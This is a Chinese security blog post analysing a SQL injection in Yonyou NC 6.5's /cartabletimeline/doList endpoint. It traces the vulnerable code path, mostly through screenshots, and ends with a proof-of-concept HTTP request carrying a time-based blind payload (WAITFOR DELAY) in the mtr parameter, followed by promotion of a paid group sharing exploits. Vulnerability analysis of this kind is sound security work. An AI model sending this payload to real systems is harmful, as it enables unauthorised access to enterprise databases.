#  用友NC 漏洞分析--cartabletimeline存在SQL注入   
WLwl  神农Sec   2025-02-10 02:03  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，学习文档，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。  
#   
  
原文链接：https://forum.butian.net/article/627  
  
作者：WLwl  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x1 漏洞描述**  
  
  
用友NC是一款大型erp企业管理系统与电子商务平台。用友网络科技股份有限公司用友NC存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。  
## 影响版本  
  
用友NC6.5  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x2 漏洞分析**  
  
  
VsmAction  
类中此处存在@Servlet  
注解，也就是说当访问路径为/cartabletimeline  
会直接定位到这里。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzS6cXU8nH4cVicrOqORdYl7A6f7nBhmsFKZE4zA6eR5RKOvOxwjvadysQ/640?wx_fmt=png&from=appmsg "")  
  
在doList  
方法上面标注了@Action  
标签，当我们请求/cartabletimeline/doList  
的时候就会进入该doList  
方法。  
  
继续看doList  
方法的详细代码  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzS2yW352cMPazADTnWkDlXAWaoIicJvhKGh20icWhJUF4oLPmlymUjBVKg/640?wx_fmt=png&from=appmsg "")  
  
这里接收了一个参数为mtr  
，并且传入getVehicleApplyInfo  
函数来执行，传入时将sb  
变量转为字符串类型。  
  
getVehicleApplyInfo  
函数是carTalbeService  
对象进行调用的，而carTalbeService  
对象是通过ICarTalbeService  
接口来进行实例化。  
  
进入ICarTalbeService  
接口  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzS7E2VIpJgj8nuTouTTUkH6fAOY2yaFeovkyLbwzLpGf9ZteOnm946SQ/640?wx_fmt=png&from=appmsg "")  
  
追踪ICarTalbeService  
接口的实现类  
定位到PsndocServiceImpl  
类  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzSQfrpQqd21b6l47Lnd6oiaX80pk86qJdejKEob4rZPVFGHg4YhB8pZZw/640?wx_fmt=png&from=appmsg "")  
  
观察getVehicleApplyInfo  
具体实现内容  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzSkHNEIO9D2n7mWQWAWPg41ZfwJ7WbTReRQPTnyd9j24OEX0iajU3qccQ/640?wx_fmt=png&from=appmsg "")  
  
传入参数后调用了getCarTableQueryService().getgetUserVehicleApplyInfo  
  
查看getCarTableQueryService  
内容  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzSicHichk0v4mG0J7ib32FLS2bcYSgL44icSXqCfYqKDS8icaxk0WSXDxXjfA/640?wx_fmt=png&from=appmsg "")  
  
这里返回的是一个carTableQueryService  
类型的对象，那么去看carTableQueryService  
类中的getgetUserVehicleApplyInfo  
方法  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzSOGOptcYibS3rRjbmlVG0aGXic4jWclkcvMBoaVcnb9LqxMdV6NKxZgAQ/640?wx_fmt=png&from=appmsg "")  
  
跟踪queryVOs  
，定位到CRUDHelper  
类  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzSUrLJlGU7lib9NwpmKPzjL2umhocaYjxibvBRlIjaPS2g7HUs6icJauudA/640?wx_fmt=png&from=appmsg "")  
  
类方法getCRUDService()  
 根据传入的类名AggVOCrudServiceImpl  
去加载并返回一个 ILfwCRUDService  
 类型的实例  
  
定位到ILfwCRUDService  
类  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzSnNPNFARHnVIrHxNWGcZqSyWBzcKOtHuqU2qPW2DeAUdKkcoaPWNkCQ/640?wx_fmt=png&from=appmsg "")  
  
查看queryVOs  
函数内容  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzSMUbpXc4Ob6Csbx4ib4QHDh0RIWfR7cYDb6vbTHYUzLryKx7rVG1iaYRA/640?wx_fmt=png&from=appmsg "")  
  
通过服务定位器ServiceLocator  
来获取一个实现了 ILfwQueryService  
 接口的服务实例  
  
定位到ILfwQueryService  
实现类LfwQueryServiceImpl  
参数wherePart  
不为空，且不以"where"  
字符结尾，则拼接进sql语句  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzSEUKaPFUPBv3q2nnnC0wiaTwywuHZb4KMobW2icWR3hmR3qUSUgbvC5UA/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzSxGJ5IE3wGyWedibKEPyefmibk3ygHIQs2mx0EAPxNDQNlQ4nZkiaxCVbQ/640?wx_fmt=png&from=appmsg "")  
  
至此代码分析结束  
##   
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x3 漏洞POC**  
  
```
GET /portal/pt/cartabletimeline/doList?pageId=login&mtr=1)WAITFOR+DELAY+%270:0:2%27--+ HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brConnection: keep-alivePriority: u=4
```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzSRcImDLcfogj3IFBzneEicAV0iboDvwpDUHvZHxRQfCmobtfZkYq7iaLdw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x4 内部圈子详情介绍**  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```  
  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
神农安全团队创建的知识星球一直从未涨价，永久价格40  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVsxbULEhU6VQ8Oax3kWlkSg0OGhRI7Ep3Bx4QMicCjuZicJqicfeeA4wjUzyF6jkQ2GvQ0k4ibicuOic0g/640?wx_fmt=png&from=appmsg "")  
  
  
**欢迎加入星球一起交流，券后价仅40元！！！ 即将满300人涨价**  
  
**长期更新，更多的0day/1day漏洞POC/EXP**  
  
****  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUFHRFrovMmVsgNgErMUkzSxDyjjgbIxnpydTnErGWicrELxeRL9mWpD2zaWaoPgMMDiapyQC423nxQ/640?wx_fmt=png&from=appmsg "")  
  
****  
    
```
```  
  
  
  
